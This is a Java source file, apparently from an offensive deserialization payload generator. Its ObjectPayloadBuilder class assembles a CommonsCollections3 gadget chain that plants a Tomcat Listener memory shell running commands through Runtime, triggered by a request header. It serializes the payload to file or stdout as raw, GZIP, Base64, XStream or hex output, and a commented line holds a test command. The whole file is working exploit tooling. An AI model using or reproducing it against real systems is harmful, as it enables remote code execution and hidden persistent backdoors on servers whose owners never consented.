package com.ppp;

import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.Middleware;
import com.ppp.annotation.Save;
import com.ppp.chain.collections3.CommonsCollections3;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.ppp.utils.Serializer;

import java.io.PrintStream;

/**
 * @author Whoopsunix
 */
public class ObjectPayloadBuilder {

    public static void main(String[] args) throws Exception {
        final Class<? extends ObjectPayload> cls = CommonsCollections3.class;

        SinksHelper sinksHelper = new SinksHelper();
        String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
        sinksHelper.setSink(sinks[0]);
        sinksHelper.setEnchant(EnchantType.MEMSHELL);
//        sinksHelper.setOutput(Save.Base64);
        sinksHelper.setSave(true);
//        sinksHelper.setCommand("open -a Calculator.app");

        MemShellHelper memShellHelper = new MemShellHelper();
        memShellHelper.setMiddleware(Middleware.Tomcat);
        memShellHelper.setMemShell(MemShell.Listener);
        memShellHelper.setMemShellFunction(MemShellFunction.Runtime);
        // 内存马信息
        memShellHelper.setHEADER("xxx");

        sinksHelper.setMemShellHelper(memShellHelper);

        // 生成 Gadget
        Object gadget = builder(cls, sinksHelper);

    }

    public static Object builder(Class<? extends ObjectPayload> cls, SinksHelper sinksHelper) throws Exception {
        // 生成 Gadget
        ObjectPayload payload = cls.newInstance();
        Object gadget = payload.getObject(sinksHelper);

        // 保存
        PrintStream out = System.out;
        String output = sinksHelper.getOutput();
        Object result = null;

        if (output == null) {
            Serializer.serialize(gadget, out);
            if (sinksHelper.isSave()) {
                Serializer.serialize(gadget, new PrintStream(sinksHelper.getSavePath()));
            }
        } else if (output.equalsIgnoreCase(Save.GZIP)) {
            Serializer.serializeGZip(gadget, out);
            if (sinksHelper.isSave()) {
                Serializer.serializeGZip(gadget, new PrintStream(sinksHelper.getSavePath()));
            }
        } else if (output.equalsIgnoreCase(Save.Base64)) {
            result = Serializer.serializeBase64(gadget);
        } else if (output.equalsIgnoreCase(Save.Base64gzip)) {
            result = Serializer.serializeBase64GZip(gadget);
        } else if (output.equalsIgnoreCase(Save.XStream)) {
            result = Serializer.serializeXStream(gadget);
        } else if (output.equalsIgnoreCase(Save.hexAscii)) {
            result = Serializer.serializeHexAscii(gadget);
        }
        System.out.println(result);

        return gadget;
    }

}
